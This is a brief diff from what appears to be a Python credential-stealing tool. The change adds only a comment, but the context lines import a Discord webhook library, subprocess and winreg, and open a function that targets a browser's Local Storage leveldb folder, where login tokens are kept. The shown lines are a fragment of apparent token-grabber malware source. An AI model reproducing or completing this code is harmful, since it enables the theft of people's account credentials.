@@ -2,6 +2,7 @@ import requests, os, re, subprocess, sys, shutil, string, random
 from dhooks import Webhook, Embed
 from winreg import *
 
+#send me an issue or requests suggestions
 
 def GhostExt(path):
     path += '\\Local Storage\\leveldb'
